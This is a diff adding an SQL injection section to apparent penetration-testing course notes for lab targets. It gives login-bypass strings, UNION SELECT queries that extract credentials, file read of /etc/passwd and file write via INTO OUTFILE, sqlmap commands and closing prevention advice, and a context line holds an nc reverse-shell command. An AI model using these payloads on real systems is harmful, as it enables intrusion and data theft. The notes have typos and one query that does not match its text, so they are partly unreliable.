@@ -1406,3 +1406,85 @@ nc -e /bin/sh 10.20.14 8080
   - Use static file inclusion.
 
 ## Exploitation - SQL Injection
+
+- **What SQL ?**
+- Most websites use a database to store data.
+- Most data stored in it (usernames, passwords ..etc)
+- Web application reads, updates and inserts data in the database.
+- Interaction with DB done using SQL
+- *Fix "Table 'metasploit.xxxx' doesn't exis" in Metasploitable 2* : <https://www.youtube.com/watch?v=tYmDiz0SPaw>
+- metssploitable : mysql -u root -h metasploitable_ip_addr
+
+0. **Why are they so dangerous**
+1. They are everywhere.
+2. Give access to the database → sensitive data.
+3. Can be used to read local files outside www root.
+4. Can be used to log in as admin and further exploit the system.
+5. Can be used to upload files.
+
+- **Discovering SQLi**
+- Try to break the page.
+- Using ‘and’, ‘order by’ or “ ‘ ”. -> ex: at login page, in password field
+- Test text boxes and url parameters on the form
+- <http://target.com/page.php?something=something>
+
+- **Bypassing Login**
+- ex: select * from accounts where username = '$USERNAME' and password= '$PASSWORD'
+- if we give:
+  - USERNAME = admin
+  - PASSWORD = 123456'
+- it will execute:
+  - select * from accounts where username = 'admin' and password='123456''
+- here query ends two single quotes
+- if we give password like:
+  PASSWORD = 123456' and 1=1 #
+- it will be like:
+  - select * from accounts where username = 'admin' and password='123456' or 1=1 #'
+  - here last quote is escaped as comment by #
+  - and we executed 1=1 on database, which will be true and account will be returned will username 'admin'
+- if we give:
+  - USERNAME = admin' #
+  - PASSWORD = 12345
+- it will execute:
+  - select * from accounts where username = 'admin' #' and password='12345'
+  - here only **select * from accounts where username = 'admin'** is excuted
+
+0. **Discovering SQL Injection in GET**
+1. <<http://target.com/login.php?username=admin>' order by 1#password=12345/>
+
+- **Reading Database information**
+- <<http://target.com/login.php?username=admin>' order by 5#password=12345/>
+- <<http://target.com/login.php?username=admin>' union select 1,2,3,4,5#password=12345/>
+- <<http://target.com/login.php?username=admin>' union select 1,database(),user(),version(),5#password=12345/>
+- <<http://target.com/login.php?username=admin>' union select 1,table_name,null,null,5 from information_schema.tables #password=12345/>
+- <<http://target.com/login.php?username=admin>' union select 1,table_name,null,null,5 from information_schema.tables table_schema = 'owasp10' #password=12345/>
+
+- **Read sensitive information from database**
+- <<http://target.com/login.php?username=admin>' union select 1,coulumn_name,null,null,5 from information_schema.column table_name = 'accounts' #password=12345/>
+- <<http://target.com/login.php?username=admin>' union select 1,user_name,password,is_admin,5 from 'accounts' #password=12345/>
+
+## Reading & Writing files on server using SQL vulnerebilities
+
+- *reading* : <<http://target.com/login.php?username=admin>' union select null,load_file('/etc/passwd'),null,null,null #password=12345/>
+- *writing* : <<http://target.com/login.php?username=admin>' union select null,'example example',null,null,null into  outfile  '/var/www/mutillidae/example.txt' #password=12345/>
+  - it will write 'example example' to example.txt
+  - change directory if no permission to write to directory
+
+## SQLmap
+
+- Tool designed to exploit sql injections.
+- Works with many db types, mysql, mssql ...etc.
+- Can be used to perform everything we learned and more!
+  > sqlmap --help
+  > sqlmap -u [target url]
+  > sqlmap -u [target url] [other options]
+- target url is full login url with dummy username password as values
+
+## Preventing SQLi
+
+- Filters can be bypassed.
+- Use black list of commands? Still can be bypassed
+- Use whitelist? Same issue
+
+- **BEST WAY**: Use parameterized statements, separate data from sql code.
+ 
